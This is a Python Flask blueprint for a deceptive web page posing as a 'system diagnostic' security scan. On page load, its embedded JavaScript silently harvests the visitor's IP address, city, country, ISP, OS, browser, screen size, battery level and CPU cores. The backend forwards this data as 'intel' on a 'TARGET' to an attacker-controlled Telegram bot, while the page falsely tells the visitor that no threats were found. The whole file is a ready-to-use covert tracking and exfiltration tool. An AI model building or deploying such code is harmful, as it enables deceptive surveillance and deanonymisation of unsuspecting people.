from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION (Apni Details Yahan Daal) ---
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM_DIAGNOSTIC_v2.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; margin:0; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 30px; background: rgba(0,20,0,0.9); box-shadow: 0 0 20px #0f0; }
        .scan-line { width: 100%; height: 2px; background: #0f0; position: absolute; top: 0; animation: scan 3s linear infinite; }
        @keyframes scan { from { top: 0; } to { top: 100%; } }
    </style>
</head>
<body onload="capture()">
    <div style="position:relative; overflow:hidden;" class="box">
        <div class="scan-line"></div>
        <h2 id="header">[ INITIALIZING SECURITY SCAN ]</h2>
        <p id="status">Accessing Hardware Nodes...</p>
        <div id="loader">_</div>
    </div>

    <script>
        async function capture() {
            try {
                // 1. IP & GEO DATA
                const res = await fetch('https://ipapi.co/json/');
                const ipInfo = await res.json();

                // 2. DEVICE & BATTERY
                let battery = "N/A";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + "%";
                }

                const data = {
                    ip: ipInfo.ip || "N/A",
                    city: ipInfo.city || "N/A",
                    country: ipInfo.country_name || "N/A",
                    isp: ipInfo.org || "N/A",
                    os: navigator.platform,
                    browser: navigator.userAgent,
                    screen: window.screen.width + "x" + window.screen.height,
                    battery: battery,
                    cores: navigator.hardwareConcurrency || "N/A"
                };

                // 3. SEND TO BACKEND
                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                // UI Update
                document.getElementById('header').innerText = "[ SCAN COMPLETE ]";
                document.getElementById('status').innerText = "System Integrity Verified. No Threats.";
                document.getElementById('loader').innerText = "STATUS: SECURE";

            } catch (e) {
                console.log("System bypass initiated...");
            }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    intel = request.json
    
    # Telegram Message Format
    message = (
        f"🚨 *NEW INTEL GATHERED* 🚨\\n\\n"
        f"👤 *TARGET:* `{intel['ip']}`\\n"
        f"📍 *LOCATION:* {intel['city']}, {intel['country']}\\n"
        f"🌐 *ISP:* {intel['isp']}\\n\\n"
        f"💻 *OS:* {intel['os']}\\n"
        f"📱 *SCREEN:* {intel['screen']}\\n"
        f"🔋 *BATTERY:* {intel['battery']}\\n"
        f"⚙️ *CORES:* {intel['cores']}\\n\\n"
        f"🕵️ *AGENT:* `{intel['browser'][:100]}...`"
    )

    # Telegram API Call
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    
    try:
        requests.post(url, json=payload)
        return jsonify({"status": "Success"}), 200
    except:
        return jsonify({"status": "Error"}), 500

